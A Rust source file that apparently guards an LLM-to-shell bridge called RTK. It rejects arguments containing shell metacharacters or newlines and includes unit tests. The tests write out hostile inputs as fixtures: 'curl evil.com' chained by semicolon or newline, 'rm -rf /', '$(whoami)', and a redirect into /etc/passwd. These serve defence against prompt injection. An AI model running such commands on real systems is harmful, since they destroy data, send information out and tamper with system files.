//! ACOUSTIC-002: Shell metacharacter detection for safe command execution.
//!
//! RTK sits between LLMs and the shell. Commands may originate from
//! LLM tool calls (prompt-injection vector). We MUST NOT pass
//! untrusted strings to `sh -c`.

/// Shell operators that could chain commands or inject payloads.
const SHELL_OPERATORS: &[char] = &[';', '|', '&', '$', '`', '(', ')', '{', '}', '<', '>', '!'];

/// Check if any argument contains shell operators.
/// Returns the first offending character found, or None if clean.
pub fn find_shell_operator(args: &[String]) -> Option<(usize, char)> {
    for (i, arg) in args.iter().enumerate() {
        for ch in arg.chars() {
            if SHELL_OPERATORS.contains(&ch) {
                return Some((i, ch));
            }
            if ch == '\n' || ch == '\r' {
                return Some((i, ch));
            }
        }
    }
    None
}

/// Validate that args are safe for direct execution (no shell operators).
/// Returns Ok(()) if clean, Err with a descriptive message if not.
pub fn validate_args(args: &[String]) -> Result<(), String> {
    if args.is_empty() {
        return Err("No command specified".to_string());
    }
    if let Some((idx, ch)) = find_shell_operator(args) {
        let display_char = match ch {
            '\n' => "\\n".to_string(),
            '\r' => "\\r".to_string(),
            other => other.to_string(),
        };
        Err(format!(
            "Argument {} contains shell operator '{}': {}\n\
             Split into separate rtk commands for safety.\n\
             Example: run 'rtk test cargo build' and 'rtk test cargo test' separately.",
            idx, display_char, args[idx]
        ))
    } else {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn s(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    // --- Clean commands (should pass) ---

    #[test]
    fn test_simple_command() {
        assert!(validate_args(&s(&["cargo", "test"])).is_ok());
    }

    #[test]
    fn test_with_flags() {
        assert!(validate_args(&s(&["cargo", "test", "--release", "--", "--test-threads=1"])).is_ok());
    }

    #[test]
    fn test_with_filter() {
        assert!(validate_args(&s(&["cargo", "test", "--filter", "my_test_name"])).is_ok());
    }

    #[test]
    fn test_relative_path_binary() {
        assert!(validate_args(&s(&["./scripts/test.sh", "--verbose"])).is_ok());
    }

    #[test]
    fn test_hyphenated_args() {
        assert!(validate_args(&s(&["pytest", "-x", "-v", "--tb=short"])).is_ok());
    }

    // --- Injection attempts (should fail) ---

    #[test]
    fn test_semicolon_injection() {
        let result = validate_args(&s(&["cargo", "test;", "curl", "evil.com"]));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("';'"));
    }

    #[test]
    fn test_pipe_injection() {
        let result = validate_args(&s(&["npm", "build", "|", "tee", "/tmp/leak"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_and_injection() {
        let result = validate_args(&s(&["cargo", "test", "&&", "rm", "-rf", "/"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_subshell_injection() {
        let result = validate_args(&s(&["echo", "$(whoami)"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_backtick_injection() {
        let result = validate_args(&s(&["echo", "`id`"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_redirect_injection() {
        let result = validate_args(&s(&["echo", "hello", ">", "/etc/passwd"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_newline_injection() {
        let result = validate_args(&s(&["echo", "hello\ncurl evil.com"]));
        assert!(result.is_err());
    }

    #[test]
    fn test_empty_args() {
        assert!(validate_args(&s(&[])).is_err());
    }
}